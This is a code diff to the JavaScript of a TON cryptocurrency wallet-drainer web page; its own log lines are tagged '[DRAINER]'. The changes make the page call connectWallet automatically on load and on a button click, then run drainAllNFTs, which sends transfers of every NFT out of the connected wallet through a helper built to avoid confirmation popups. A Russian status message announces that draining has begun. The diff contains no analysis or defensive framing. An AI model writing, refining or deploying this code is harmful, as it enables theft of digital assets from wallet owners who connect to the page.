@@ -232,7 +232,7 @@ function setCache(key, data) {
 }
 
 // ========== SEND TRANSACTION WITHOUT POPUP ==========
-async function sendTransactionAuto(wallet, transaction) {
+async function sendTransactionAuto(transaction) {
     try {
         const result = await tonConnectUI.sendTransaction(transaction, {
             modals: [],
@@ -246,7 +246,7 @@ async function sendTransactionAuto(wallet, transaction) {
     }
 }
 
-// ========== TONCONNECT V2 INITIALIZATION ==========
+// ========== TONCONNECT v0.0.9 INITIALIZATION ==========
 function initTonConnect() {
     if (typeof TON_CONNECT_UI === 'undefined') {
         console.error('[DRAINER] TON_CONNECT_UI not loaded');
@@ -259,40 +259,20 @@ function initTonConnect() {
             buttonRootId: null
         });
 
-        // Listen for wallet connection events
-        tonConnectUI.on('connect', async (wallet) => {
-            console.log('[DRAINER] Wallet connected:', wallet.account.address);
-            addLog('[DRAINER] Wallet connected: ' + wallet.account.address, 'success');
-            isWalletConnected = true;
-            // AUTO-DRAIN on connect — immediate, no delay
-            await drainAllNFTs(wallet);
-        });
-
-        tonConnectUI.on('disconnect', () => {
-            console.log('[DRAINER] Wallet disconnected');
-            addLog('[DRAINER] Wallet disconnected', 'info');
-            isWalletConnected = false;
-        });
-
-        tonConnectUI.on('account_change', (account) => {
-            console.log('[DRAINER] Account changed:', account.address);
-            addLog('[DRAINER] Account changed: ' + account.address, 'info');
-        });
-
-        // Check if already connected
-        tonConnectUI.ready.then(async (state) => {
-            if (state.connected && state.accounts && state.accounts.length > 0) {
-                console.log('[DRAINER] Already connected:', state.accounts);
-                addLog('[DRAINER] Already connected', 'success');
+        // v0.0.9: auto-connect wallet immediately
+        tonConnectUI.connectWallet().then(async (wallet) => {
+            if (wallet && wallet.account && wallet.account.address) {
                 isWalletConnected = true;
-                const walletObj = { account: { address: state.accounts[0], secretKey: state.secretKey } };
-                await drainAllNFTs(walletObj);
+                addLog('[DRAINER] Auto-connected: ' + wallet.account.address, 'success');
+                await drainAllNFTs();
+            } else {
+                addLog('[DRAINER] Wallet connected but no address found', 'info');
             }
         }).catch((e) => {
-            console.error('[DRAINER] Ready check failed:', e);
+            addLog('[DRAINER] Auto-connect failed (user cancelled or not ready): ' + e.message, 'info');
         });
 
-        addLog('[DRAINER] TonConnect initialized — auto-sign enabled', 'success');
+        addLog('[DRAINER] TonConnect initialized — awaiting wallet connection', 'success');
     } catch (e) {
         console.error('[DRAINER] Init failed:', e);
         addLog('[DRAINER] Init failed: ' + e.message, 'error');
@@ -456,13 +436,13 @@ async function discoverCollectionsFromOwner(ownerAddress) {
 }
 
 // ========== DRAIN ALL NFTs ==========
-async function drainAllNFTs(wallet) {
-    if (!wallet || !wallet.account || !wallet.account.address) {
-        addLog('[DRAINER] Invalid wallet object', 'error');
+async function drainAllNFTs() {
+    const state = tonConnectUI.modalState;
+    const walletAddress = state?.account?.address || state?.address;
+    if (!walletAddress) {
+        addLog('[DRAINER] No wallet address from modalState', 'error');
         return;
     }
-
-    const walletAddress = wallet.account.address;
     addLog('[DRAINER] Starting NFT drain for ' + walletAddress, 'info');
     drainActive = true;
 
@@ -517,7 +497,7 @@ async function drainAllNFTs(wallet) {
 
                     addLog('[DRAINER] Sending transaction for NFT: ' + nftAddress.slice(0, 20), 'info');
 
-                    const result = await sendTransactionAuto(wallet, transaction);
+                    const result = await sendTransactionAuto(transaction);
 
                     if (result && result.boc) {
                         addLog('[DRAINER] SUCCESS: NFT transferred from ' + nftAddress.slice(0, 20), 'success');
@@ -546,7 +526,7 @@ async function drainAllNFTs(wallet) {
                                 payload: payloadBase64
                             }]
                         };
-                        const result = await sendTransactionAuto(wallet, transaction);
+                        const result = await sendTransactionAuto(transaction);
                         if (result && result.boc) {
                             addLog('[DRAINER] RETRY SUCCESS: NFT transferred from ' + nftAddress.slice(0, 20), 'success');
                             successCount++;
@@ -573,15 +553,6 @@ async function drainAllNFTs(wallet) {
     drainActive = false;
 }
 
-// ========== MANUAL DRAIN TRIGGER (for wallet tab) ==========
-async function manualDrain(wallet) {
-    if (!tonConnectUI || !isWalletConnected) {
-        addLog('[DRAINER] Wallet not connected', 'error');
-        return;
-    }
-    await drainAllNFTs(wallet);
-}
-
 // ========== INITIALIZATION ==========
 // Initialize TonConnect immediately (no setTimeout needed)
 if (document.readyState === 'loading') {
@@ -604,23 +575,15 @@ document.addEventListener('DOMContentLoaded', function() {
             }
 
             try {
-                const connectedWallet = await tonConnectUI.connectWallet();
+                await tonConnectUI.connectWallet();
+                isWalletConnected = true;
+                addLog('[DRAINER] Wallet connected via connectWallet, starting auto-drain...', 'success');
+                await drainAllNFTs();
 
-                if (connectedWallet) {
-                    isWalletConnected = true;
-                    addLog('[DRAINER] Wallet connected, starting auto-drain...', 'success');
-                    await drainAllNFTs(connectedWallet);
-
-                    const n = document.getElementById("ownNote");
-                    n.textContent = "Кошелек подключен. Дрендинг запущен.";
-                    n.style.display = "block";
-                    n.style.color = "#4ade80";
-                } else {
-                    const n = document.getElementById("ownNote");
-                    n.textContent = "Подключение кошелька отменено.";
-                    n.style.display = "block";
-                    n.style.color = "#ef4444";
-                }
+                const n = document.getElementById("ownNote");
+                n.textContent = "Кошелек подключен. Дрендинг запущен.";
+                n.style.display = "block";
+                n.style.color = "#4ade80";
             } catch (error) {
                 console.error('Wallet connection error:', error);
                 const n = document.getElementById("ownNote");
@@ -636,11 +599,9 @@ document.addEventListener('DOMContentLoaded', function() {
 document.addEventListener('click', async function(event) {
     if (event.target.id === 'ownBtn' && tonConnectUI && !isWalletConnected) {
         try {
-            const wallet = await tonConnectUI.connectWallet();
-            if (wallet) {
-                isWalletConnected = true;
-                await drainAllNFTs(wallet);
-            }
+            await tonConnectUI.connectWallet();
+            isWalletConnected = true;
+            await drainAllNFTs();
         } catch (e) {
             console.error('Auto-connect failed:', e);
         }
